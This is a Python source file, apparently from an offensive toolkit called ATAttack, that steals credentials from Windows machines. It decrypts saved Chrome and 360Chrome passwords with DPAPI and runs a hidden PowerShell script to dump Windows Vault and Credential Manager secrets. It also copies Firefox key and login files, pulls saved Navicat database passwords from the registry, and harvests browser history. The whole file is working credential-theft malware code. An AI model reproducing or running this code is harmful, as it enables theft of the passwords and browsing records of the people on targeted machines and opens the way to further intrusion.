#! /usr/bin/env python2.7
# -*- coding: utf-8 -*-


import win32api
import win32con
import multiprocessing
import sqlite3
import win32crypt
import configparser
import shutil
import win32cred
import random,string
import os
from ATAttack.framework.constant import constant
import subprocess
import _subprocess as sub
import tempfile
from winreg import OpenKey, HKEY_CURRENT_USER, EnumKey, EnumValue,CloseKey

tmp = tempfile.gettempdir()
command_list = []

class utility(object):
    def __init__(self,):
        # self.Installation = regedit()
        pass

    def check(self):
        """ chlid class should override this function """
        return

    def decypt(self):
        """ chlid class should override this function """
        return

    def copy_db(self,db_path,database_path):
        try:
            if os.path.isfile(db_path):
                shutil.copy(db_path, database_path)
            return database_path
        except Exception:
            pass

    def str_rangdom(self):
        return ''.join(random.sample(string.ascii_letters + string.digits,8))

    def clean_file(self, db_path):
        try:
            os.popen('RD /S /Q ' + db_path)
        except Exception:
            return False

class enumratorBaseThreaded(multiprocessing.Process, utility):
    def __init__(self,q=None,w=None):
        utility.__init__(self,)
        multiprocessing.Process.__init__(self)
        self.q = q
        self.w = w
        return

    def run(self):
        try:
            hosts = self.check()
            self.decypt()
            for host in hosts:
                self.q.append(host)
        except Exception:
            pass
class Chromelog(enumratorBaseThreaded):

    def __init__(self,q=None,w=None):
        self.q = q
        self.w = w
        super(Chromelog, self).__init__(q=q)
        self.path = os.path.join(
            constant.profile['LOCALAPPDATA'], u'Google\Chrome\\User Data\Default\history')
        self.query = 'SELECT action_url, username_value, password_value FROM logins'
        self.logpath = os.path.join(
            constant.profile['LOCALAPPDATA'], u'Google\Chrome\\User Data\Default\Login Data')

    def decypt(self):
        if os.path.isfile(self.logpath):
            databases = self.copy_db(self.logpath, tmp + os.sep + self.str_rangdom())
        try:
            conn = sqlite3.connect(databases)
            cursor = conn.cursor()
            cursor.execute(self.query)
            for url, login, password in cursor.fetchall():
                password = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                if password:
                    print "Chrome browser decryption result: "
                    print 'Title: ' + url
                    print 'Username: ' + login
                    print 'Password: ' + password
        except Exception:
            return False
        finally:
            conn.close()
            os.remove(databases)

    def check(self):
        try:
            if os.path.isfile(self.path):
                print '[*] Finding histroy in Chrome'
                c = sqlite3.connect(self.path)
                cursor = c.cursor()
                select_statement = "SELECT urls.url FROM urls;"
                cursor.execute(select_statement)
                results = cursor.fetchall()
                for i in results:
                    command_list.append(i[1])
                c.close()
                return command_list
        except Exception:
            pass

class ielog(enumratorBaseThreaded):
    def __init__(self,q=None,w=None):
        self.q = q
        self.w = w
        super(ielog, self).__init__(q=q)
        self.path = r"Software\\Microsoft\\Internet Explorer\\typedURLs"
        print '[*] Finding histroy in IE'

    def decypt(self):
        try:
            cmdline = '''
                    try
                    {
                        #Load the WinRT projection for the PasswordVault
                        $Script:vaultType = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
                        $Script:vault	  = new-object Windows.Security.Credentials.PasswordVault -ErrorAction silentlycontinue
                    }
                    catch
                    {
                        throw "This module relies on functionality provided in Windows 8 or Windows 2012 and above."
                    }
                    #endregion

                    function Get-VaultCredential
                    {
                        process
                        {
                            try
                            {
                                &{
                                    $Script:vault.RetrieveAll()
                                } | foreach-Object {  $_.RetrievePassword() ; "Username......";$_.UserName;"######";"Password......";$_.Password;"######";"Website......";$_.Resource;"_________" }
                            }
                            catch
                            {
                                Write-Error -ErrorRecord $_ -RecommendedAction "Check your search input - user: $UserName resource: $Resource"
                            }
                        }
                        end
                        {
                            Write-Debug "[$cmdName] Exiting function"
                        }
                    }
                    Get-VaultCredential
                    '''
            command = ['powershell.exe', '/c', cmdline]
            info = subprocess.STARTUPINFO()
            info.dwFlags = sub.STARTF_USESHOWWINDOW | sub.CREATE_NEW_PROCESS_GROUP
            info.wShowWindow = sub.SW_HIDE
            p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE,
                                 universal_newlines=True)
            results, _ = p.communicate()
            passwords = []
            for result in results.replace('\n', '').split('_________'):
                values = {}
                if result:
                    for res in result.split('######'):
                        values[res.split('......')[0]] = res.split('......')[1]
                    passwords.append(values)
            print "Get common credentials for windows vault :" + "\n" + str(passwords)
            CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
            CredRead = win32cred.CredRead
            creds = win32cred.CredEnumerate(None, 0)  # Enumerate credentials
            credentials = []
            for package in creds:
                try:
                    target = package['TargetName']
                    creds = CredRead(target, CRED_TYPE_GENERIC)
                    credentials.append(creds)
                except Exception:
                    pass
            values_ = {}
            for cred in credentials:
                values_['service'] = cred['TargetName']
                values_['UserName'] = cred['UserName']
                values_['pwd'] = cred['CredentialBlob'].decode('utf16')
            print "Get windows vault web credentials :" + "\n" + str(values_)
        except Exception:
            pass

    def check(self):
        reg_root = win32con.HKEY_CURRENT_USER
        reg_flags = win32con.WRITE_OWNER | win32con.KEY_WOW64_64KEY | win32con.KEY_ALL_ACCESS
        try:
            key = win32api.RegOpenKeyEx(reg_root, self.path, 0, reg_flags)
            i = 0
            while True:
                url = (win32api.RegEnumValue(key, i))
                command_list.append(url[1])
                i += 1
                win32api.RegCloseKey(key)
        except Exception:
            pass
        return command_list

class firefoxlog(enumratorBaseThreaded):
    def __init__(self, q=None,w=None):
        self.q = q
        self.w = w
        super(firefoxlog, self).__init__(q=q,w=w)
        self.path = os.path.join(
            constant.profile['APPDATA'],u'Mozilla\\Firefox\\Profiles\\')

    def profiles(self):

        iniPath = os.path.join(constant.profile['APPDATA'],
                               r'Mozilla\Firefox\profiles.ini')
        config = configparser.ConfigParser()
        config.read(iniPath)
        return os.path.join(
            constant.profile['APPDATA'],r'Mozilla\Firefox',config['Profile0']['Path'] + '\\') .replace("/", "\\")

    def decypt(self):

        key = ['key4.db', 'key3.db', 'logins.json']
        for db in key:
            filename = self.profiles() + db
            if os.path.exists(filename):
                shutil.copy(filename,self.w)

    def check(self):
        try:
            fs = os.listdir(self.path)
            print '[*] Finding histroy in firefox'
            dict = []
            for f1 in fs:
                tmp_path = os.path.join(self.path, f1)
                if os.path.isdir(tmp_path):
                    dict.append(tmp_path + r'\places.sqlite')
            for ct in dict:
                conn = sqlite3.connect(ct)
                c = conn.cursor()
                c.execute('select id, url, title from moz_places')
                results = c.fetchall()
                for i in results:
                    command_list.append(i[1])
                c.close()
            return command_list
        except Exception:
            pass

class jishulog(enumratorBaseThreaded):

    def __init__(self, q=None,w=None):
        self.q = q
        super(jishulog, self).__init__(q=q)
        self.path = os.path.join(
            constant.profile['LOCALAPPDATA'],r'360Chrome\Chrome\User Data\Default\Login Data')
        self.history_db = os.path.join(
            constant.profile['LOCALAPPDATA'], u'360Chrome\\Chrome\\User Data\\Default\\history')

    def decypt(self):
        if os.path.exists(self.path):
            databases = self.copy_db(self.path,tmp + os.sep + self.str_rangdom())
            try:
                conn = sqlite3.connect(databases)
                cursor = conn.cursor()
                cursor.execute(
                    'SELECT action_url, username_value, password_value FROM logins')
                for result in cursor.fetchall():
                    password = win32crypt.CryptUnprotectData(
                        result[2], None, None, None, 0)[1]
                    if password:
                        print "360 browser decryption result: "
                        print 'Title: ' + result[0]
                        print 'Username: ' + result[1]
                        print 'Password: ' + password
                conn.close()
                os.remove(databases)
            except Exception :
                pass

    def check(self):
        try:
            if os.path.exists(self.history_db):
                print '[*] Finding histroy in 360Chrome'
                c = sqlite3.connect(self.history_db)
                cursor = c.cursor()
                select_statement = "SELECT urls.url FROM urls;"
                cursor.execute(select_statement)
                results = cursor.fetchall()
                for i in results:
                    command_list.append(i[1])
                c.close()
                return command_list
        except Exception:
            return False

class Navicat(enumratorBaseThreaded):

    def __init__(self, q=None,w=None):
        self.q = q
        self.w = w
        super(Navicat, self).__init__(q=q)

    def decypt(self):
        pass

    def get_info(self,reg):
        key = OpenKey(HKEY_CURRENT_USER, reg)
        conns = []
        try:
            i = 0
            while 1:
                name = EnumKey(key, i)
                conns.append(name)
                i += 1
        except:
            pass
        hosts = []
        usernames = []
        passwords = []
        for i in conns:
            key = OpenKey(HKEY_CURRENT_USER, reg + '\\' + i)
            try:
                j = 0
                while 1:
                    name, value, type = EnumValue(key, j)
                    if name == 'Host':
                        hosts.append(value)
                    if name == 'UserName':
                        usernames.append(value)
                    if name == 'Pwd':
                        passwords.append(value)
                    j += 1
            except:
                pass
        CloseKey(key)
        for i in range(len(hosts)):
            if len(hosts[i]) is not 0:
                print 'host_name:' + hosts[i] + '  ' + 'username:' + usernames[i] + '  ' + 'password:' + passwords[i]

    def check(self):
        try:
            for i, j in constant.regs.items():
                try:
                    self.get_info(j)
                except:
                    continue
        except Exception:
            pass
# class Software():
#
#     def __init__(self):
#         pass
#
#     def run(self):
#         chosenEnums = [firefoxlog,Chromelog,jishulog,Navicat]
#         command_list_queue = multiprocessing.Manager().list()
#         enums = [enum(q=command_list_queue,w='') for enum in chosenEnums]
#         for enum in enums:
#             enum.start()
#         for enum in enums:
#             enum.join()
#         log_tmp = list(set(command_list_queue))
    # for history in log_tmp:
    #     with open(constant.tmp_name, "a") as file:
    #         file.writelines(history + '\r\n')
    #     file.close()
#
#
